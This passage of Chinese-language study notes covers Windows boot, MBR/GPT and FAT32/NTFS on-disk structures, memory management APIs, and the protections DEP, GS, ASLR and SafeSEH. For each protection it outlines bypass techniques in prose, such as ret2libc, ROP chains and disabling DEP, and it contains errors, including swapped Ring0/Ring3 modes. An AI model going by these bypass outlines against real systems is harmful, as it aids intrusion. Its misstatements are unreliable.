BIOS引导模式</strong>：</p><p>使用MBR磁盘格式，系统只能在MBR格式磁盘上；这里以win的启动为例；过程如下：</p><ol><li><p>通电电压不稳，主板发送RESET信号给CPU，稳定后不在发送。CPU执行0xFFFF0h处指令，此处为BIOS程序</p></li><li><p>BIOS执行，进行POST（加电自检）木有问题后加载第一个扇区（MBR）到内存0x7c00h处</p></li><li><p>执行MBR，查找第一个活动分区，并将其第一个扇区（PBR）加载到内存</p></li><li><p>执行PBR，跳过BPB到可执行代码处NTLDR</p><blockquote><p>BPB:即BIOS参数记录块，描述能够使可执行引导代码找到相关参数的信息。记录着本分区的起始扇区、结束扇区、文件存储格式、硬盘介质描述符、根目录大小、FAT 个数,分配单元的大小等重要参数。</p></blockquote></li><li><p>PBR读取VBR（卷引导记录，用于告诉计算机OS在分区里的位置）；CPU跳转执行bootmgr代码</p></li><li><p>寻找BootMGR，木有则寻找ntldr（在win 8之后默认bootmgr）</p></li><li><p>执行bootmgr，读取BCD文件，如果有多个系统则列举供选择</p></li><li><p>选择win则加载winload.exe到内存，CPU执行，并读取\windows\bootstat.dat；接着加载内核程序Ntoskrnl.exe，将CPU执行权交给内核</p></li><li><p>内核程序初始化完成</p></li></ol><p><strong>MBR分区模式</strong>：</p><p>即主引导记录分区，也叫做DOS（磁盘操作系统）分区。包括：主引导记录MBR（开机必读）、硬盘主分区表DPT、引导扇区标记boot record ID；</p><ul><li><p>MBR：占前446字节，存放着系统主引导程序，位于磁盘0柱面、0磁头、1扇区</p></li><li><p>DPT：占64字节，记录磁盘基本分区，一共包含4个分区项，每项16字节；</p><blockquote><p>1B分区状态—3B起始磁头号+起始扇区+柱面号—1B分区类型（识别主分区还是扩展分区）—3B分区结束磁头号+扇区+柱面号—1D本分区之前已经占用的扇区数—1D本分区占用总扇区数</p></blockquote></li><li><p>Boot record ID：占2字节，合法的话就=0xAA55</p></li><li><p>扩展分区：正常情况下按照DPT项数只有4个分区，为了更多分区扩展，在每个逻辑盘前都有上述结构，其中的第一项存放当前逻辑盘的地址，第二项存放的是下一个逻辑盘前的引导记录等，最后两项为空。</p></li><li><p>最多只能识别2TB、最多4个主分区或3主分区+1扩展分区；</p></li></ul><hr><p><strong>UEFI BIOS引导模式</strong>：</p><p>win7支持，win8默认，使用GPT磁盘格式，没有自检过程；</p><p>阶段 = SEC（安全验证）—PEI（EFI前期初始化）—DXE（驱动执行环境）—BDS（启动设备选择）—TSL（操作系统加载前期）—RT（系统运行阶段）—AL（关机或系统恢复）</p><ol><li>同上进行通电，但CPU执行UEFI指令，并进行相关设备的初始化</li><li>查找EFI分区（FAT32格式，不一定是第一个分区，其中包含系统引导的关键数据程序）</li><li>加载<code>\Boot\EFI\bootmgfw.efi</code>（专用于引导windows的引导文件）</li><li>读取BCD文件，其中包含多个系统的信息，可供用户选择</li><li>后面同上</li></ol><p><strong>GPT分区模式</strong>：</p><p>全局唯一标识分区表，是可扩展固件接口EFI标准的一部分，用于代替MBR</p><p>包括=保护MBR+GPT头+分区表+分区区域+分区表备份+GPT头备份</p><ul><li><p>保护MBR：存放了一份传统MBR（1扇区），防止不支持GPT的管理工具破坏硬盘。在这个MBR中只有一个标识为0xEE的分区（也没有引导程序等，只有一个DPT、结束标志和磁盘签名），来表明该硬盘使用GPT分区表</p><blockquote><p>0x07普通分区、0x27恢复分区、0xEE该扇区为PMBR</p></blockquote></li><li><p>GPT头：用于记录分区表的信息，下面仅列出部分重要信息</p><blockquote><p>0x0C-4B-GPT头字节总数、0x18-8B-GPT头所在扇区号、0x48-8B-分区表起始扇区号、0x50-4B-分区表项数、0x54-4B-每个分区表项数字节数</p></blockquote></li><li><p>分区表：2-33号扇区，共可容纳128个分区表项，每个表项128B</p><blockquote><p>0x20-8B-分区起始地址、0x28-8B-分区结束地址</p></blockquote></li><li><p>每个分区最多1EB=1048576TB空间、支持128个主分区、分区表大小不固定</p></li></ul><h3 id="文件系统"><a href="#文件系统" class="headerlink" title="文件系统"></a>文件系统</h3><p>文件系统是让OS可以管理的一种文件集合。</p><ul><li>分类包括：扩展文件系统（Ext）、新技术文件系统（NTFS）、文件分配表（FAT）、光盘文件系统（CDFS）、高性能文件系统（HPFS）等。</li><li>内容包括：文件系统数据、内容（具体文件）、元数据（文件信息）、文件名、应用程序等</li></ul><p>在win下常用簇作为单位，扇区sector &lt; 簇Cluster：4KB，为单位分配空间，即占用空间，其内部的未使用叫内部碎片，外部碎片是介于两个簇之间但 &lt; 4KB的未使用的空间。</p><blockquote><p>松弛/文件残留空间：指的是文件最后一个数据单元中未使用的字节；<br>卷松弛：硬盘在使用前需要格式化，有些空间未经格式化就无法被使用，这种未被格式化的空间就叫卷松弛（卷是指磁盘，真正实用的即格式化好的叫做分区）</p></blockquote><p>分配簇/文件空间的算法主要有：</p><ul><li>连续分配：文件连续存储</li><li>链式分配：指针指向下一簇，必须连着读</li><li>索引分配：所有位置的指针都写入一个索引块中</li></ul><p>Windows支持的文件系统有：FAT12、FAT16、<strong>FAT32</strong>、<strong>NTFS</strong>、WINFS等。Linux支持Ext2、Ext3、Minix、NTFS等。</p><h4 id="FAT32"><a href="#FAT32" class="headerlink" title="FAT32"></a>FAT32</h4><p>FAT32即文件分配表FAT表项大小为32位，exFAT的表项大小64位；采用链式分配法管理已经分配或未分配的簇；</p><p>所有版本的FAT布局相同：物理盘划分为=引导区—文件分配表区（FAT区）—数据区（DATA区），前两者合称为系统区</p><ul><li><p>引导区：从头开始占用三个扇区，其中保存了物理盘每扇区的字节数、每一簇对应的扇区数以及引导记录等；其后面还有部分留白扇区（0x24以后的内容会根据版本号有区别，这里以FAT32为例子）；FAT16只占用1个扇区，而且后面没有留白</p><p>在FAT32中，引导区=DBR+保留分区；下面是分区引导区的内容（只有部分较为重要内容）</p><blockquote><p>DBR：Dos Boot Record即分区引导扇区，用于引导操作系统引导程序的一部分，用于加载文件系统元数据</p></blockquote></li></ul><div class="table-container"><table><thead><tr><th>字节位置</th><th>内容</th><th>字节位置</th><th>内容</th></tr></thead><tbody><tr><td>0x00-0x02</td><td>汇编指令跳转引导代码EB 58 90</td><td>0x03-0x0a</td><td>文件系统版本</td></tr><tr><td>0x0b-0x0c</td><td>每扇区的字节数</td><td>0x0d</td><td>每簇的扇区数</td></tr><tr><td>0xe-0xf</td><td>FAT表相对起始扇区号</td><td>0x10</td><td>FAT表个数（一般是2，用于备份）</td></tr><tr><td>0x15</td><td>介质描述符，0xf8表示固定磁盘，0xf0表示可移动磁盘</td><td>0x18-0x19</td><td>每磁道扇区数</td></tr><tr><td>0x1a-0x1b</td><td>磁头数</td><td>0x24-0x27</td><td>FAT表的扇区数</td></tr><tr><td>0x30-0x31</td><td>DBR大小</td><td>0x32-0x33</td><td>引导扇区的备份扇区号</td></tr><tr><td>0x52-0x59</td><td>FAT文件系统类型</td><td>0x5a-0x1fd</td><td>未使用，但可以包含OS启动代码</td></tr><tr><td>0x1fe-0x1ff</td><td>0xAA55结束标志</td><td></td></tr></tbody></table></div><ul><li><p>FAT区：由两个相同的FAT表构成，用于备份，其中包含了文件占用的簇链、空闲空间等；FAT中每个簇都有一个表项，例如三号表项就对应的3号簇；表项记录如下（注意虽然是32位，但高4位保留，FAT16=0002H-FEFFH个可用簇号）：</p><ul><li>未使用/空闲的簇：0x0000</li><li>损坏的簇：-9或0xffffff7</li><li>文件下一个簇的地址</li><li>文件最后一个簇或文件结束标志：-1或0x0fffffff</li></ul></li><li><p>根目录区（ROOT区）：属于数据区的一部分；在FAT32中区域、大小都不固定，而在FAT12/16中，固定在FAT区之后的32个扇区，最多可以存放512（32*16）个目录项；根目录下的任何文件或者子目录都会有一个根目录表项，一般位于第二簇（数据区才开始有簇！）</p></li><li><p>目录区：属于数据区，一个目录项占32字节。以表的形式存在，又叫做目录表—DIR（Directory_Table）或文件目录表—FDT（File_Directory_Table）每个表项对应一个文件或者子目录相关信息（在FAT中文件和文件夹处理方式相同）</p><blockquote><p> 子目录项的最后一项为0。长文件名的需要用长文件名（LFN）目录项来存储。文件属性一项最高两位不用：0x01只读、0x02隐藏文件、0x04系统文件、0x08包含磁盘卷标签的表项、0x10子目录表项、0x20归档文件（即长文件名）</p></blockquote></li></ul><div class="table-container"><table><thead><tr><th>位置</th><th>说明</th><th>位置</th><th>说明</th></tr></thead><tbody><tr><td>00-07</td><td>文件正名</td><td>08-0A</td><td>扩展名</td></tr><tr><td>0B</td><td>文件属性(按二进制分)</td><td>0C</td><td>保留</td></tr><tr><td>0D-0F</td><td>文件创建时间，24位</td><td>10-11</td><td>16位创建时间，相对于1980年</td></tr><tr><td>12-13</td><td>16位最近访问时间</td><td>14-15</td><td>起始簇号的高16位</td></tr><tr><td>16-17</td><td>16位最新修改时间</td><td>18-19</td><td>16位最新修改时间，相对1980</td></tr><tr><td>1A-1B</td><td>起始簇号低16位</td><td>1C-1F</td><td>文件字节长度</td></tr></tbody></table></div><p>当使用长目录项时，必定会有一个标准目录项，标准目录项中的短文件名由长文件名中派生出来，“长文件名前6个字符+‘~’（0x7e）+1个数字+文件扩展名”。LEN目录项都依次位于标准目录项之前。</p><blockquote><p>下面是LFN表项的具体内容，同样32字节，一个长文件名文件可能有多个该表项；文件名以Unicode格式保存，且占2字节</p><div class="table-container"><table><thead><tr><th>位置</th><th>内容</th><th>位置</th><th>内容</th></tr></thead><tbody><tr><td>0x0</td><td>序列号</td><td>0x1-0xa</td><td>长文件名的5个文件名字符</td></tr><tr><td>0xb</td><td>长文件名属性，LFN=0x0F</td><td>0xc</td><td>保留</td></tr><tr><td>0xd</td><td>校验和，根据短文件名算出</td><td>0xe-0x19</td><td>长文件名的6个文件名字符</td></tr><tr><td>0x1a-0x1b</td><td>保留</td><td>0x1c-0x1f</td><td>长文件名的2个文件名字符</td></tr></tbody></table></div><p>其中序列号从1起，若是最后的则加上’0x40’（或运算）并填入，若对应文件/目录被删记为’0xE5’</p></blockquote><p><img src="https://s2.loli.net/2024/08/08/aNZUVGriyACpoLm.png" alt="fat32.png"></p><p>对于删除的文件来说，文件正名第一字节为<code>0xe5</code>，表示清空回收站；如果只是移动到回收站并没有清空，则只会改变FAT区的簇链。</p><h4 id="NTFS"><a href="#NTFS" class="headerlink" title="NTFS"></a>NTFS</h4><p>win_xp之后首选文件系统，使用B+树来组织目录项，解决了FAT的磁盘大小限制、空间利用率以及文件名长度等问题。NTFS具体内容太过麻烦，这里仅作部分说明（<a href="https://forensics.xidian.edu.cn/cat/cn/blog/03-ntfs">NTFS文件系统解析 – 取证猫 (xidian.edu.cn)</a>）</p><blockquote><p>同样用簇为单位，但是稍有区别，在NTFS中有逻辑簇号LCN与虚拟簇号VCN之分，前者是实际上占的簇号，后者是本文件的第几个簇号</p></blockquote><p>NTFS使用NTFS Log记录详细的事务日志，跟踪卷的文件系统的元数据变化（人话：有相关文件记录元数据）。</p><p>格式：1个引导扇区+15个扇区的NTLDR区域+MFT区+文件区</p><ul><li>引导扇区：包含引导程序和BPB参数（用于定位后面的NTLDR区），格式与FAT的分区引导区相似</li></ul><div class="table-container"><table><thead><tr><th>字节偏移</th><th>内容</th><th>字节偏移</th><th>内容</th></tr></thead><tbody><tr><td>0x00</td><td>JMP指令</td><td>0x03</td><td>OEM标识‘NTFS’</td></tr><tr><td>0x0B</td><td>每扇区字节数</td><td>0x0D</td><td>每簇扇区数</td></tr><tr><td>0x0E</td><td>保留扇区数</td><td>0x10</td><td>0</td></tr><tr><td>0x15</td><td>介质描述符</td><td>0x16</td><td>0</td></tr><tr><td>0x18</td><td>每磁道扇区数</td><td>0x1A</td><td>磁头数</td></tr><tr><td>0x1C</td><td>隐藏扇区数</td><td>0x20</td><td>0</td></tr><tr><td>0x28</td><td>总扇区数</td><td>0x30</td><td><code>$MFT</code>簇号</td></tr><tr><td>0x38</td><td><code>$MFTMirr</code>簇号</td><td>0x40</td><td>文件记录段字节数</td></tr><tr><td>0x41</td><td>0</td><td>0x44</td><td>索引缓冲簇数</td></tr><tr><td>0x45</td><td>0</td><td>0x48</td><td>卷序列数</td></tr><tr><td>0x50</td><td>校验和</td><td>0x54</td><td>启动指令码</td></tr><tr><td>0x01FE</td><td>0xAA55结束标志</td><td></td></tr></tbody></table></div><ul><li><p>NTLDR区：引导程序的一部分（与NTFS没有必要联系，以前多用该程序来启动加载windows）</p></li><li><p><strong>主控文件表MFT</strong>：包含卷中所有的信息，以数组实现，每个文件记录项大小1KB，一个文件至少一项。在这个表中的前16项位置固定，且有备份；以<code>$</code>符开头，0-11如下，12-15保留。</p><blockquote><p>注意：MFT区包含下面这些内容，<code>$MFT</code>表项的<code>$DATA</code>属性中记录的是真正MFT项的位置（文件目录的MFT），而<code>$MFTMirr</code>的内容同上</p></blockquote></li></ul><div class="table-container"><table><thead><tr><th>文件名</th><th>描述</th><th>文件名</th><th>描述</th></tr></thead><tbody><tr><td><code>$MFT</code></td><td>主文件表</td><td><code>$MFTMirr</code></td><td>主文件表的备份</td></tr><tr><td><code>$LogFile</code></td><td>日志文件，记录元数据变化</td><td><code>$Volumn</code></td><td>卷文件</td></tr><tr><td><code>$AttrDef</code></td><td>属性定义列表</td><td><code>$Root</code></td><td>根目录文件(索引树)</td></tr><tr><td><code>$Bitmap</code></td><td>位图文件，每位对应1簇，1有0未</td><td><code>$Boot</code></td><td>引导文件，包含DBR扇区</td></tr><tr><td><code>$BadClus</code></td><td>坏簇记录文件</td><td><code>$Secure</code></td><td>文件安全属性与访问控制</td></tr><tr><td><code>$UpCase</code></td><td>大小写字符转换表文件</td><td><code>$Extend</code></td><td>扩展属性</td></tr></tbody></table></div><p>  对于每一个表项（包括上面这些文件），大多以’FILE‘（4B）开头，以0xFF FF FF FF结束；表项=MFT头+属性</p><p>  每一个文件/MFT表项有对应的64位文件引用地址=16位序列号（见下表，放高位）+ 48位文件地址（也可以说是表项序号，从0递增，放低位），对于较大文件的属性除了MFT外，还有一个扩展区域来存放多余的内容。</p><div class="table-container"><table><thead><tr><th>字节偏移</th><th>内容</th><th>字节偏移</th><th>内容</th></tr></thead><tbody><tr><td>0-3</td><td>MFT标志(好的‘FILE’，坏的‘BAAD’)</td><td>4-5</td><td>更新序列号</td></tr><tr><td>6-7</td><td>更新序列号的大小与数组</td><td>8-15</td><td>日志文件序列号</td></tr><tr><td>16-17</td><td>序列号</td><td>18-19</td><td>硬连接数</td></tr><tr><td>20-21</td><td>第一个属性的偏移地址</td><td>22-23</td><td>标志00表删除-01正在使用-02目录被删-03目录正在使用</td></tr><tr><td>24-27</td><td>文件记录的实际长度</td><td>28-31</td><td>文件记录的分配长度</td></tr><tr><td>32-39</td><td>基本文件记录中的文件索引号</td><td>40-41</td><td>下一个属性ID</td></tr><tr><td>42-43</td><td>边界</td><td>44-47</td><td>文件记录参考号</td></tr><tr><td>48-1023</td><td>属性和固定值</td><td></td></tr></tbody></table></div><p>  属性分为两部分，属性头+属性体（属性内容）。属性头描述了本属性名字长度等，以及最关键的是常驻属性（属性内容存在MFT中）还是非常驻属性（存在文件区），一般来说900B以下的都是常驻属性，其属性体数据结构不同。</p><blockquote><p>常驻与非常驻用于说明属性内容的位置，属性内容是说明是什么。每一个属性都有独特的数据结构，即属性体结构。在NTFS中文件内容是属性的一部分，对应的属性类型为<code>$DATA</code></p></blockquote><p>  常驻属性头格式如下：</p><div class="table-container"><table><thead><tr><th>字节偏移</th><th>内容</th><th>字节偏移</th><th>内容</th></tr></thead><tbody><tr><td>0-3</td><td>属性类型</td><td>4-7</td><td>属性长度</td></tr><tr><td>8</td><td>0常驻，1非常驻</td><td>9</td><td>属性名长度</td></tr><tr><td>10-11</td><td>属性名的开始偏移</td><td>12-13</td><td>标志</td></tr><tr><td>14-15</td><td>属性ID</td><td>16-19</td><td>属性体大小</td></tr><tr><td>20-21</td><td>属性体偏移</td><td></td></tr></tbody></table></div><p>  非常驻属性头据格式如下：</p><div class="table-container"><table><thead><tr><th>字节偏移</th><th>内容</th><th>字节偏移</th><th>内容</th></tr></thead><tbody><tr><td>0-15</td><td>同常驻（）</td><td>16-23</td><td>属性体的起始虚拟簇号</td></tr><tr><td>24-31</td><td>属性体结束虚拟簇号</td><td>34-35</td><td>压缩单位大小</td></tr><tr><td>36-39</td><td>无意义</td><td>40-47</td><td>属性体的分配大小</td></tr><tr><td>48-55</td><td>属性体实际大小</td><td>56-63</td><td>属性体初始大小</td></tr><tr><td>64+</td><td>DataRun（属性内容）</td><td></td></tr></tbody></table></div><p>  非常住属性的内容叫做数据流DataRun，流的大小不一，其第一个字节的低4位表示流大小的字节数，高4位表示包含流的起始簇地址的字节数（DataRunList），后面紧跟着分别是数据流长度+数据流偏移（单位都是簇）</p><blockquote><p>关于虚拟簇号即VCN，区别于逻辑簇号LCN，前者的起始位置是本文件系统开头，后者则是实际的硬盘上的簇号位置</p></blockquote><p>特性：NTFS中其索引区别于FAT的线性搜索，采用的是B*树进行，索引和名字等都是以属性记录的。此外在NTFSv3之后，还有EFS，即加密文件系统，可以命令行下使用<code>cipher.exe</code>来使用。在NTFS中还有稀疏文件与文件压缩的方法，来提高空间利用率</p><blockquote><p>稀疏文件：将文件内容（仅<code>$DATA</code>）中的非0数据写入磁盘，而将连续的0以非常驻属性中的备用流表示，该流仅包含流的长度（0数据的簇数），而没有其起始地址。剩下的非0数据则以常规数据流形式存在</p></blockquote><p>对于NTFS文件的删除，首先要在<code>$Root</code>中删除相关索引项，之后设置对应的MFT表项，最后在<code>$Bitmap</code>中将对应的位设置为0.</p><h3 id="Windows内存结构与管理"><a href="#Windows内存结构与管理" class="headerlink" title="Windows内存结构与管理"></a>Windows内存结构与管理</h3><p><strong>DOS内存布局</strong>：运行于实模式中，寻址范围只有1MB。</p><div class="table-container"><table><thead><tr><th>地址</th><th>内容</th></tr></thead><tbody><tr><td>F0000-FFFFF</td><td>ROM BIOS</td></tr><tr><td>A0000-F0000</td><td>设备保留区</td></tr><tr><td>400-4F0、4F0-500、500-700</td><td>BIOS、用户、DOS通信区</td></tr><tr><td>0-400</td><td>中断向量表</td></tr></tbody></table></div><p><strong>Windows内存布局</strong>：</p><p>开机后一般运行于保护模式下，这就使得每个32位进程都拥有4GB的虚拟内存寻址空间，且会根据OS版本对虚拟内存空间进行划分，下面是x86下32win的虚拟内存大致分布情况</p><ul><li><p>FFFFFFFF-80000000=2GB（内核模式分区）：操作系统使用，不可读写；其中的数据所有进程共享，但被保护</p><blockquote><p>Ring0（用户模式）-Ring3（内核模式）；Ring0仅限于用户模式区，后者可访问所有内存、硬件、使用所有处理器指令，但是对其代码空间不提供保护</p></blockquote></li><li><p>7FFFFFFF-7FFF0000=64KB（禁入分区）：防止跨系统或跨用户边界的传输数据，不可读写</p></li><li><p>7FFEFFFF-00010000（用户模式区）：进程私有空间</p></li><li><p>0-0000FFFF=64KB（空指针赋值区）：用户捕捉NULL指针，不可读写；用来帮助程序员捕获对空指针的赋值</p></li></ul><p><strong>虚拟地址转译</strong>：默认情况下x86上的windows使用二级页表，来将虚拟地址转换为物理地址，页表大小默认4KB；</p><p>32位虚拟地址=页目录索引+页表索引+字节索引（12bit）</p><blockquote><p>CR3寄存器页目录——页目录索引找到具体页目录项(PDE)——页表——根据页表索引找到页表项(PTE)——得到具体物理地址</p></blockquote><p><strong>内存分配与管理函数</strong>：内存API大致分三类有以下三类</p><ul><li><p>虚拟内存管理：适用于占用内存较大，但不一定立即用到的程序；能够提前分配一小部分内存，需要时就会从保留的内存块中再利用</p><ol><li>分配/保留虚拟内存；参数：内存地址—大小—类型—保护标志</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">VirtualAlloc</span>(IpMem,Size,Type,Access)</span><br><span class="line"><span class="comment">//Ipmem可NULL,Size单位字节</span></span><br><span class="line"><span class="comment">//Type类型MEM_COMMINT提交内存、MEM_RESERVE保留内存、MEM_TOP_DOWN尽可能在高地址分配内存</span></span><br><span class="line"><span class="comment">//Access,PAGE_READONLY内存可读、PAGE_READWRITE可读可写</span></span><br></pre></td></tr></table></figure><ol><li>释放虚拟内存；参数：地址—大小—类型</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">VirtualFREE</span>(IpMem,Size,Type)</span><br><span class="line"><span class="comment">//Type为释放的类型,MEM_DECOMMIT取消内存提交、MEM_RELEASE释放</span></span><br></pre></td></tr></table></figure><ol><li>改变页保护属性；参数：地址—大小—类型—旧属性地址</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">VirtualProtect</span>(IpMem,Size,Access,IpOldAccess)</span><br><span class="line"><span class="comment">//前三者同上，最后是一个地址用来存放旧的保护属性</span></span><br></pre></td></tr></table></figure><ol><li>内存锁定与解锁；</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">VirtualLock</span>(IpMem,Size)<span class="comment">//确保进程运行时，指定内存总在内存中</span></span><br><span class="line"><span class="built_in">VirtualUnlock</span>(IpMem,Size)<span class="comment">//</span></span><br></pre></td></tr></table></figure></li><li><p>堆管理：适用于经常需要分配小块内存的程序</p><blockquote><p>缺省堆：默认1MB，进程在编译时个已更改该值，在程序运行时如果需要使用临时内存则会从其中分配内存。Win32确保在任意时刻都只能有一个线程可以在缺省堆上分配释放内存</p></blockquote><ol><li>创建新堆</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">HeapCreate</span>(flOption,dWINitalSize,cbMaximumSize)</span><br><span class="line"><span class="comment">//flOption可选：0、HEAP_NO_SERIALIZE、HEAP_GENERATE_EXCEPTIONS</span></span><br><span class="line"><span class="comment">//后两者指出堆的初始化大小和最大容量，单位Byte，会自动对齐为页大小的整数倍</span></span><br></pre></td></tr></table></figure><ol><li>分配堆内存/重新分配堆内存</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">HeapAlloc</span>(hHeap,dwFlags,dwBytes)</span><br><span class="line"><span class="comment">//堆句柄，可由HeapCreate、GetProcessHeap取得</span></span><br><span class="line"><span class="comment">//可选HEAP_ZERO_MEMORY(内存清0)、HEAP_GENERATE_EXCEPTIONS、HEAP_NO_SERIALIZE</span></span><br><span class="line"><span class="comment">//要分配的堆内存大小</span></span><br><span class="line"><span class="built_in">HeapReAlloc</span>(hHEAP,dwFlags,lpMem,dwBytes)</span><br><span class="line"><span class="comment">//第三个参数指明内存堆地址</span></span><br></pre></td></tr></table></figure><ol><li>释放堆内存</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">HeapFree</span>(hHeap,dwFlags,lpMem)</span><br></pre></td></tr></table></figure></li><li><p>内存映射文件管理：简单说就是无需打开文件等操作，可以通过映射快速操纵文件内容</p><p>相关API<code>CreateFileMapping()</code>、<code>MapViewOfFile()</code>、<code>UnmapViewOfFile()</code>、<code>FlushViewOfFile()</code></p></li></ul><h3 id="Windows内存安全机制"><a href="#Windows内存安全机制" class="headerlink" title="Windows内存安全机制"></a>Windows内存安全机制</h3><p>相关位置在windows Defender中应用和浏览器控制下的攻击防护设置</p><h4 id="数据执行保护DEP"><a href="#数据执行保护DEP" class="headerlink" title="数据执行保护DEP"></a>数据执行保护DEP</h4><p>通过使可写内存的不能执行，或者来让可执行内存不可写来消除威胁。常用于防范缓冲区溢出，其他叫法：NX/XD/WX；</p><p>具体见<a href="https://learn.microsoft.com/zh-cn/windows/win32/memory/data-execution-prevention">数据执行保护 - Win32 apps | Microsoft Learn</a>；</p><p>在Win中DEP相关设置如下：</p><ul><li>OptOut：除了手动添加到排除列表中的进程外，均开起了DEP保护；多用在Server中</li><li>OptIn：仅应用于核心的系统可执行文件；多用于普通win</li><li>AlwaysOn：对所有进程启用DEP保护，没有例外，不可关闭</li><li>AlwaysOff：所有禁用，也不能被动态开启</li></ul><p>具体实现有两种模式：硬件实现和软件实现</p><ul><li>如果CPU支持内存页NX属性，则支持硬件实现，可通过Windows DEP tabsheet查看（桌面环境下高级系统设置-高级性能设置-数据执行保护）</li><li>软件支持的DEP不能直接阻止在数据页上执行代码</li></ul><p><strong>对抗措施</strong>：通过执行已经加载的模块中的指令，或者是调用系统函数不受DEP的影响，但是使用的栈上的参数则是攻击者构造的。</p><ul><li><p>利用ret-to-libc执行命令或进行API调用，如WinExec等</p><blockquote><p>在库中找到一段执行系统命令的代码或函数，用这段代码的地址覆盖返回地址；参考<a href="https://www.cnblogs.com/zhang293/p/9026587.html">内存保护机制及绕过方法——利用Ret2Libc绕过DEP之ZwSetInformationProcess函数 - zhang293 - 博客园 (cnblogs.com)</a></p></blockquote></li><li><p>将包含ShellCode的内存页面标记为可执行，在跳过去执行</p></li><li><p>分配可执行内存，再将ShellCode复制到其中，再跳进去执行</p><blockquote><p>需要使用ROP技术（能够连续调用已存在的程序代码，来创建一连串指令码序列）调用API函数WriteProcessMemory、HeapCreate、VirtualAlloc、memcopy实现</p></blockquote></li><li><p>尝试关闭DEP再运行ShellCode</p><blockquote><p>一个进程的DEP开启标志保存在内核结构中（_KPROCESS），当DEP置用时ExecuteDisable被置位，禁用时ExecuteEnable被置位，当Permanent置位时表明这些设置不可更改。需要借助NtQueryInformationProcess()和NtSetInformationProcess()函数来设置ProcessExecuteFlags类。</p></blockquote></li></ul><h4 id="栈溢出检查GS"><a href="#栈溢出检查GS" class="headerlink" title="栈溢出检查GS"></a>栈溢出检查GS</h4><p>在VS中默认设置该选项</p><p>原理：当程序启动时，会首先计算出该程序的cookie值（动态、4B），然后将其保存在加载模块的.data节中，如果函数被调用，那么该值就会被复制到栈中（retAd、EBP之后，局部变量之前），用于在函数结束时进行检查。此外他对栈中变量进行重新排序：对函数栈帧进行重排，将字符串缓冲区分配在栈帧的最高地址上、将函数参数复制到寄存器或栈缓冲区上，防止参数被溢出</p><p>条件：当函数有字符串缓冲区（且&gt;=5字节时）或使用_alloca函数在栈上分配空间时，编译器才在栈中保存该cookie值。</p><p><strong>缺陷</strong>：</p><ul><li>一个函数中含有多个缓冲区时，都放在同一个栈里面，可以从一个缓冲区溢出到另一个缓冲区</li><li>对于参数数量不确定的函数来说，预先不知道函数参数的个数，因此无法进行保护</li><li>alloca()函数动态分配的缓冲区不可避免地放在栈顶</li><li>结构成员当中如果有缓冲区时，这个缓冲区将位于struct或class声明的固定位置</li></ul><p><strong>绕过</strong>：</p><ul><li>利用异常处理器绕过cookie检查</li><li>替换栈和.data节中的cookie来绕过</li><li>覆盖父函数的栈数据来绕过GS检查</li></ul><h4 id="地址空间随机分配ASLR"><a href="#地址空间随机分配ASLR" class="headerlink" title="地址空间随机分配ASLR"></a>地址空间随机分配ASLR</h4><p>进行随机化的对象有：映像（可执行文件和DLL的加载地址）、栈（每个线程起始栈的地址）、堆（改变已分配堆的基地址）</p><p>实现方式：VS编辑器—DYNAMICBASE、映像加载基址随机化</p><p><strong>缺陷及绕过</strong>：一个被多个进程同时使用的DLL，由于一直有人使用，因此其地址是固定的</p><ul><li>返回地址部分覆盖：随机化一般发生在地址的高16位，找到对应高地址空间下可以利用的跳转指令进行覆盖</li><li>大多程序在编译时没有使用随机化，因此这些程序中没有启用ASLR的模块的相关跳转指令便可以作为跳板，用来引导至恶意代码</li></ul><h4 id="SafeSEH"><a href="#SafeSEH" class="headerlink" title="SafeSEH"></a>SafeSEH</h4><p>SafeSHE用来检测和保护和防止堆栈中的SEH函数指针被覆盖的技术</p><p>原理：编译器在链接生成二进制映像文件时，会将所有合法的异常处理函数的地址解析出来制作成一张安全的SEH表，并保存在程序映像文件中的数据块里，每当这些函数被调用时，就会与SEH表中的地址进行匹配（如果映像文件不支持，则该表的地址为0）</p><p>加载过程：程序影响加载到内存时，系统定位该表，并使用Shareuser内存中的一个随机数进行加密，将加密后的表地址、映像文件开始地址、长度、合法SEH函数数目作为一条记录放入到ntdll加载模块数据内存中</p><p>异常处理过程：首先检查该异常处理程序是否在栈中，不在的话则不执行；并再次被检查是否位于映像文件的地址空间；在的话，则执行，否则：</p><p>如果该地址位于不可执行页上，则检查DEP开启状态（开了就报错，否则执行）；若位于可执行页上，则判断系统是否允许跳转到加载模块的内存空间外执行，可以则执行否则抛错</p><p><strong>绕过</strong>：必须要使用.Net编译器且开启SafeSEH连接选项</p><ul><li>利用未启用SafeSEH的模块作为跳板</li><li>利用加载模块之外的地址进行绕过（比如堆区一般会直接跳转执行）</li></ul><h3 id="Win技术栈"><a href="#Win技术栈" class="headerlink" title="Win技术栈"></a>Win技术栈</h3><p>Windows API：Win操的内核提供的接口函数，常见的就是Win32 API，但目前的win基本都是64位的，为了兼容早些时候的32位的应用，64位win中模拟出了一个32位的win，也就是一个子系统，在WoW64中实现。上述API函数一般都是位于dll中的</p><ul><li><code>kernel32.dll</code>：负责内存管理、进程管理等</li><li><code>user32.dll</code>：负责处理用户的请求</li><li><code>gdi32.dll</code>：用于在屏幕上显示文本图形</li></ul><p>Windows SDK：Software Develope 